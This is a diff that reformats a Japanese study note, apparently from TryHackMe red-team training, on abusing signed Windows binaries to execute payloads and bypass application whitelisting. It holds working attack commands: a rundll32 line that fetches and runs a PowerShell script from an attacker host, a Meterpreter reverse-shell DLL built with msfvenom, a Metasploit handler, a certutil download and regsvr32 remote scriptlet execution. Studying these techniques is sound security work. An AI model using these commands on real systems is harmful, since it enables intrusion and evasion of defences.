@@ -164,27 +164,22 @@ SMB共有フォルダからリモートファイルをダウンロード
 ```powershell
 findstr /V <dummy_string> \\<MachineName>\<ShareFolder>\<file> > c:\Windows\Temp\<file>
 ```
-
 - `/V`：指定された文字列を含まない行を出力する
 - `<dummy_string>`：ファイル内に存在しない文字列を指定することで、全行を出力させる
 
 > [!NOTE]
-> ファイル操作には他のツールも使える。LOLBASプロジェクトで確認のこと
+> ファイル操作には他のツールも使える。LOLBASプロジェクトで確認すること。
 
 ---
 
-## File実行
+# File実行
 
 - OSに内蔵されている他のシステムバイナリを悪用してペイロードの実行を実現する手法
 - ペイロードのプロセスを隠蔽・偽装できる
 - MITRE ATT&CKフレームワークでは **Signed Binary Proxy Execution** または **Indirect Command Execution** と呼ばれる
 - 防御制御の回避にも有効
 
----
-
-### File Explorer
-
-#### 基本
+## File Explorer
 
 - File ExplorerはWindows用のファイルマネージャーおよびシステムコンポーネント
 - `explorer.exe` を悪用して、信頼できる親プロセスから悪意のあるスクリプトや実行可能ファイルを起動できる（Indirect Command Execution）
@@ -193,40 +188,25 @@ findstr /V <dummy_string> \\<MachineName>\<ShareFolder>\<file> > c:\Windows\Temp
 	- 32bit：`C:\Windows\explorer.exe`
 	- 64bit：`C:\Windows\SysWOW64\explorer.exe`
 
-#### 手順
-
-`explorer.exe` を親プロセスとして子プロセスを生成：
-
+`explorer.exe` を親プロセスとして子プロセスを生成
 ```powershell
-explorer.exe /root,"<file to execute>"
+explorer.exe /root,"<file_to_execute>"
 ```
 
----
-
-### WMIC
-
-#### 基本
+## WMIC
 
 - Windows Management Instrumentation（WMIC）は、Windowsコンポーネントを管理するコマンドラインユーティリティ
 - 防御策を回避するためのバイナリ実行にも悪用される
 - MITRE ATT&CK：Signed Binary Proxy Execution（[T1218](https://attack.mitre.org/techniques/T1218/)）
 
-#### 例
-
-任意のバイナリの新しいプロセスを作成（例：`calc.exe`）：
-
+任意のバイナリの新しいプロセスを作成（例：`calc.exe`）
 ```powershell
 wmic.exe process call create calc
 ```
-
 - `process`：プロセスに関連する情報を操作するオブジェクト
 - `call create`：`process` オブジェクトに対して新しいプロセスを作成するメソッド呼び出し
 
----
-
-### Rundll32
-
-#### 基本
+## Rundll32
 
 - OS内でDLLファイルをロードして実行するMicrosoft組み込みのツール
 - 任意のペイロード実行や、JavaScriptおよびPowerShellスクリプトの実行に悪用できる
@@ -236,32 +216,24 @@ wmic.exe process call create calc
 	- 32bit：`C:\Windows\System32\rundll32.exe`
 	- 64bit：`C:\Windows\SysWOW64\rundll32.exe`
 
-#### 例
-
-`rundll32.exe` を使って `calc.exe` を実行（`calc` の部分を対象ファイル名に変更する）：
-
+`rundll32.exe` を使って `calc.exe` を実行（`calc` の部分を対象ファイル名に変更する）
 ```powershell
 rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
 ```
 
-リモートからPowerShellスクリプトをダウンロードして実行：
-
+リモートからPowerShellスクリプトをダウンロードして実行
 ```powershell
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<attacker_IP>:<PORT>/<file>.ps1');");
 ```
 
 ---
 
-## Application ホワイトリストのバイパス
+# Application ホワイトリストのバイパス
 
 - アプリケーションホワイトリストは、悪意のある未承認プログラムがリアルタイムで実行されるのを防ぐMicrosoftのエンドポイントセキュリティ機能
 - ルールベースで、承認済みアプリケーション・実行可能ファイルのリストを指定する
 
----
-
-### Regsvr32
-
-#### 基本
+## Regsvr32
 
 - WindowsレジストリにDLLを登録・登録解除するMicrosoftコマンドラインツール
 
@@ -273,51 +245,48 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 - ATT&CKの3番目に人気のある手法
 - Microsoftの信頼済みコンポーネントを使用し、メモリ内で実行されるため、アプリホワイトリストをバイパスできる
 
-#### 例（Meterpreterシェル取得）
+### 例（Meterpreterシェル取得）
 
 > [!NOTE]
-> 以下は32bit OSバージョンでの手順。64bitの場合は `regsvr32.exe` のパスと `msfvenom` のアーキテクチャが変わる
+> 以下は32bit OSバージョンでの手順。64bitの場合は `regsvr32.exe` のパスと `msfvenom` のアーキテクチャが変わる。
 
-1. 悪意のあるDLLファイルを作成（32bit OS向け）：
+1. 悪意のあるDLLファイルを作成（32bit OS向け）
 ```zsh
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -a x86 > <file_name>.dll
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<PORT> -f dll -a x86 > <file_name>.dll
 ```
 
-2. Metasploitのリスナーをセットアップ：
+2. Metasploitのリスナーをセットアップ
 ```zsh
-msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; run"
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <attacker_IP>; set LPORT <PORT>; run"
 ```
 
-3. ペイロード配信用サーバをセットアップ：
+3. ペイロード配信用サーバをセットアップ
 ```zsh
 python -m http.server
 ```
 
-4. ターゲットマシンに悪意のあるDLLをダウンロード：
+4. ターゲットマシンに悪意のあるDLLをダウンロード
 ```powershell
 certutil -URLcache -split -f http://<attacker_IP>:<PORT>/<File> C:\Windows\Temp\<File>
 ```
 
 5. `regsvr32.exe` で実行：
 
-シンプルな方法：
+シンプルな方法
 ```powershell
-c:\Windows\System32\regsvr32.exe <path to malicious dll file>
+c:\Windows\System32\regsvr32.exe <path_to_malicious_dll_file>
 ```
 
-高度な方法：
+高度な方法
 ```powershell
-c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path to malicious dll file>
+c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path_to_malicious_dll_file>
 ```
-
 - `/s`：サイレントモード（メッセージを表示しない）
 - `/n`：DLLレジスターサーバーを呼び出さない
 - `/i:`：`/n` 使用時に別のサーバーを指定
 - `/u`：unregisterメソッドで実行
 
----
-
-### Bash（WSL経由）
+## Bash（WSL経由）
 
 - MicrosoftはWindows 10/11・Server 2019でLinux環境のサポートを追加した
 - この機能はWindows Subsystem for Linux（[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)）として知られ、[WSL1とWSL2](https://docs.microsoft.com/en-us/windows/wsl/compare-versions)が存在する
@@ -325,7 +294,6 @@ c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path t
 - `bash.exe` はLinux環境と対話するためのMicrosoftツール
 
 - `bash.exe` はMicrosoftの署名付きバイナリであるため、Windowsアプリケーションホワイトリストのバイパスに悪用できる
-
 ```powershell
 bash.exe -c <path-to-payload>
 ```
@@ -335,22 +303,22 @@ bash.exe -c <path-to-payload>
 ![600](../画像ファイル/Pasted%20image%2020230623172928.png)
 
 > [!NOTE]
-> `bash.exe` を使用するには、Windows 10でWindows Subsystem for Linuxが有効かつインストールされている必要がある
+> `bash.exe` を使用するには、Windows 10でWindows Subsystem for Linuxが有効かつインストールされている必要がある。
 
 ---
 
-## その他のテクニック
+# その他のテクニック
 
-### Shortcuts
+## Shortcuts
 
-[3. Windows Local Persistence](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)
+[ショートカットファイル（lnk）のバックドア化](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)
 
 - ショートカット（シンボリックリンク）は、OS内で他のファイルやアプリケーションを参照するためのテクニック
 - ユーザーがクリックすると参照先のファイルやアプリケーションが実行される
 - 攻撃者は初期アクセス・権限昇格・永続性の取得に悪用する
 - MITRE ATT&CK：[T1547](https://attack.mitre.org/techniques/T1547/009/)
 
-- ショートカット変更テクニックでは、Target:に以下のいずれかを設定してファイルを実行する：
+- ショートカット変更テクニックでは、`Target:`に以下のいずれかを設定してファイルを実行する：
 	- Rundll32
 	- PowerShell
 	- Regsvr32
